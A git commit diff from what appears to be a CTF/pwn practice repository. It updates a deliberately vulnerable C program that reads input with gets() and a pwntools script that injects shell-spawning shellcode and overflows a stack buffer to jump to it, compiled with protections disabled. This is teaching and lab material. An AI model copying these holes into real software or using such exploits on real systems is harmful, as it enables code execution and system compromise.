6caa7e0d0dddc1c789353fc0e0d8e3fb9b864a53
r888800009 <r888800009@users.noreply.github.com>
2019-09-08 23:46:03 +0800

    Update overflow

--- pwn/overflow.c
+++ pwn/overflow.c
@@ -4,6 +4,7 @@ char shellcode[256];
 
 int main() {
   char bof[10];
+  printf("hint:%p\n", shellcode);
   puts("give me shell code");
   fflush(stdout);
   gets(shellcode);
--- pwn/overflow.py
+++ pwn/overflow.py
@@ -1,9 +1,11 @@
 #!/usr/bin/env python2
 from pwn import *
 import pwnlib.shellcraft
+import pwnlib.elf
 
 # gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow
 c = process('./overflow')
+e = ELF('./overflow')
 
 context.os='linux'
 context.arch='amd64'
@@ -11,8 +13,10 @@ context.arch='amd64'
 ans = asm(shellcraft.sh())
 c.sendline(ans)
 
+print("return addr: " + hex(e.symbols['shellcode']))
+
 ans = 'A' * (10 + 8)
-ans += p64(0x404060)
+ans += p64(e.symbols['shellcode'])
 
 c.sendline(ans)
 c.interactive()
